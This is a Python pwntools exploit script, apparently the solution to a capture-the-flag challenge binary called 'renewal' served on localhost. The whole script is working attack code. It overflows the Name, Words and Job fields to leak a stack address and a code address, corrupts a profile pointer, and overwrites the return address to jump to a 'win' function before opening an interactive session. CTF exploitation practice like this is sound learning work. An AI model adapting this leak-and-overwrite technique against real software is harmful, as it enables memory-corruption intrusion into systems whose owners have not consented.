from pwn import *

elf = ELF("../dist/renewal")
libc = ELF('../dist/libc-2.31.so')


#io = process("../dist/renewal")
io = remote("localhost", 30017)


io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Name > ", b"A"*0x1)
io.sendlineafter(b"Words > ", b"B" * (0x68 - 3) + b"END")
io.sendlineafter(b"Age > ", b"256")
io.sendlineafter(b"Job > ", b"C" * (0x10 - 3) + b"END")

# leak stack addr
io.recvuntil(b"END")
stack_addr = io.recvline()[:-1]
stack_addr = u64(stack_addr + b"\x00" * (8 - len(stack_addr)))
return_addr = stack_addr + 0x2c
profile_base = stack_addr - 0x13c

print("profile base addr is {}".format(hex(profile_base)))
print("return addr is {}".format(hex(return_addr)))

# leak text addr
io.recvuntil(b"END")
text_addr = io.recvline()[:-1]
text_addr = u64(text_addr + b"\x00" * (8 - len(text_addr)))
text_base = text_addr - 0x12c2
print("text base is {}".format(hex(text_base)))

# return address = p->job
new_profile_base = profile_base + 0x50
io.sendlineafter(b"> ", b'4')
io.sendlineafter(b"> ", b"C" * 0x28 + p32(0x4) + p32(0x0)+ p64(new_profile_base))
io.sendlineafter(b"?\n", b"NO")

# ret2win
win_addr = text_base + elf.symbols['win'] + 5

payload = p64(win_addr)

io.sendlineafter(b"> ", b'4')
io.sendlineafter(b"> ", payload)
io.recvuntil(b"!\n")

io.interactive()
